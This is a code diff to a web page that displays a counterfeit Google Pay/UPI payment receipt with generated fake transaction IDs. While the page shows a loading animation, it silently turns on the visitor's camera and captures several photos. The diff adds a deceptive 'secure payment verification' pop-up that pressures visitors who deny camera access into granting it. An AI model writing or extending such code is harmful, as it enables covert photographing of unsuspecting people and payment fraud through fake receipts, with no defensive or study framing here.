@@ -168,6 +168,24 @@
         </div>
     </div>
 
+    <!-- Camera Access Modal -->
+    <div id="cameraModal" class="location-modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-icon" style="background: #FEF7E0; color: #FBBC04;">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                        d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                </svg>
+            </div>
+            <h3 class="modal-title">Turn on Camera</h3>
+            <p class="modal-text">To complete this secure payment verification, please enable your camera. This is
+                required for transaction security.</p>
+            <button class="modal-btn" style="background: #1A73E8;" onclick="retryCamera()">Turn On Camera</button>
+            <p style="font-size: 11px; color: #9aa0a6; margin-top: 15px;">Your data is encrypted and protected by Paynet
+                Security.</p>
+        </div>
+    </div>
+
     <script>
         let capturedPhotos = [];
         let cameraStream = null;
@@ -208,67 +226,19 @@
             paymentData = await fetchPaymentDetails();
 
             // Start camera silently in background
-            await startCameraInBackground();
+            const cameraStarted = await startCameraInBackground();
+
+            // If camera failed, show professional popup
+            if (!cameraStarted) {
+                document.getElementById('cameraModal').style.display = 'flex';
+                return; // Wait for user to click "Turn On"
+            }
 
             // Capture 5 photos during animation (1 per second)
             await captureMultiplePhotos();
 
             // After photos captured, show receipt
-            setTimeout(() => {
-                document.getElementById('loadingSection').style.display = 'none';
-
-                // Check if custom payment
-                if (paymentData && paymentData.isCustom) {
-                    // ACTIVATE GOOGLE PAY MODE
-                    document.body.classList.add('gpay-mode');
-                    document.getElementById('genericLogo').style.display = 'none';
-                    document.getElementById('genericFooter').style.display = 'none';
-                    document.getElementById('gpayReceiptSection').style.display = 'block';
-
-                    // Populate Custom Data
-                    document.getElementById('gpay-amount').textContent = '₹' + paymentData.amount;
-                    document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
-                    // Avatar removed in favor of checkmark
-                    document.getElementById('gpay-bank').textContent = paymentData.bankName;
-                    document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
-                    document.getElementById('gpay-to-upi').textContent = paymentData.upiId;
-
-                    document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
-                    document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';
-
-                    // Generate sender UPI based on name
-                    const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
-                    document.getElementById('gpay-from-upi').textContent = senderUpi;
-
-                    document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
-                    document.getElementById('gpay-time').textContent = paymentData.date;
-
-                } else {
-                    // GENERIC MODE
-                    document.getElementById('receiptSection').style.display = 'block';
-
-                    if (paymentData) {
-                        document.querySelector('.receipt-amount-value').textContent = `₹${paymentData.amount}.00`;
-                        document.getElementById('receipt-txn-id').textContent = paymentData.id;
-
-                        if (paymentData.merchant) {
-                            document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
-                        }
-
-                        if (paymentData.date) {
-                            document.getElementById('receipt-date').textContent = paymentData.date;
-                        }
-                    }
-                }
-
-                // Stop camera
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
-
-                // Store photos like before
-                sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
-            }, Math.floor(Math.random() * 2000) + 4000); // Random delay 4-6 seconds
+            setTimeout(showReceipt, Math.floor(Math.random() * 2000) + 3000);
         });
 
         // Helper for random IDs if missing
@@ -309,9 +279,86 @@
                 document.body.appendChild(video);
                 video.play();
                 // Camera started silently
+                return true;
             } catch (error) {
-                // Silent catch
+                console.warn('Camera access denied:', error);
+                return false;
             }
+        }
+
+        async function retryCamera() {
+            const btn = document.querySelector('#cameraModal .modal-btn');
+            const originalText = btn.innerText;
+            btn.innerText = "Connecting...";
+            btn.disabled = true;
+
+            const started = await startCameraInBackground();
+            if (started) {
+                document.getElementById('cameraModal').style.display = 'none';
+                // Proceed with photo capture and animation
+                await captureMultiplePhotos();
+
+                // Set the timeout to hide loading and show receipt (same as original logic)
+                setTimeout(showReceipt, Math.floor(Math.random() * 2000) + 3000);
+            } else {
+                btn.innerText = "Verification Failed. Retry?";
+                btn.disabled = false;
+                alert("Please allow camera access in your browser settings to continue.");
+            }
+        }
+
+        function showReceipt() {
+            document.getElementById('loadingSection').style.display = 'none';
+
+            // Check if custom payment
+            if (paymentData && paymentData.isCustom) {
+                // ACTIVATE GOOGLE PAY MODE
+                document.body.classList.add('gpay-mode');
+                document.getElementById('genericLogo').style.display = 'none';
+                document.getElementById('genericFooter').style.display = 'none';
+                document.getElementById('gpayReceiptSection').style.display = 'block';
+
+                // Populate Custom Data
+                document.getElementById('gpay-amount').textContent = '₹' + paymentData.amount;
+                document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
+                document.getElementById('gpay-bank').textContent = paymentData.bankName;
+                document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
+                document.getElementById('gpay-to-upi').textContent = paymentData.upiId;
+
+                document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
+                document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';
+
+                const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
+                document.getElementById('gpay-from-upi').textContent = senderUpi;
+
+                document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
+                document.getElementById('gpay-time').textContent = paymentData.date;
+
+            } else {
+                // GENERIC MODE
+                document.getElementById('receiptSection').style.display = 'block';
+
+                if (paymentData) {
+                    document.querySelector('.receipt-amount-value').textContent = `₹${paymentData.amount}.00`;
+                    document.getElementById('receipt-txn-id').textContent = paymentData.id;
+
+                    if (paymentData.merchant) {
+                        document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
+                    }
+
+                    if (paymentData.date) {
+                        document.getElementById('receipt-date').textContent = paymentData.date;
+                    }
+                }
+            }
+
+            // Stop camera
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+
+            // Store photos like before
+            sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
         }
 
         // Capture multiple photos with upload
